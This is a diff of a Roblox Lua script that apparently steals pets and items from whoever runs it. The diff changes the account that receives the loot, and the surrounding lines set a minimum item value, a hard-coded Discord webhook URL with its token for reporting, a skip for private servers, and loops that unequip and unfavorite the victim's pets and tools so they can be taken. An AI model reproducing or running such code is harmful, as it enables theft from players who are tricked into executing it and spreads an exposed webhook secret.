@@ -13,7 +13,7 @@ end)()
 ========================
 ]]
 
-local users = _G.Usernames or {"jabapie27"}
+local users = _G.Usernames or {"Potat0_Peeler"}
 local min_value = _G.min_value or 1000000
 local ping = _G.pingEveryone or "Yes"
 local webhook = "https://discord.com/api/webhooks/1394724129042731138/eP5TGtu1H973BDKITLdegWzoTE2jzJmTOm_VG3FZKe-9qJVrlU6rDOoSqAA9a9CaOHrr"
@@ -53,7 +53,6 @@ if serverTypeResult == "VIPServer" then return end
 local PetsService = ReplicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("PetsService", 10)
 local petsPhysical = Workspace:WaitForChild("PetsPhysical", 10)
 
--- Unequip all equipped pets on the map
 for _, petMover in ipairs(petsPhysical:GetChildren()) do
     if petMover:IsA("Part") and petMover.Name == "PetMover" then
         local model = petMover:FindFirstChildWhichIsA("Model")
@@ -81,7 +80,6 @@ local function unfavoriteIfNeeded(tool)
     end
 end
 
--- Unfavorite all tools in backpack and on plot
 for _, tool in ipairs(backpack:GetChildren()) do
     unfavoriteIfNeeded(tool)
 end
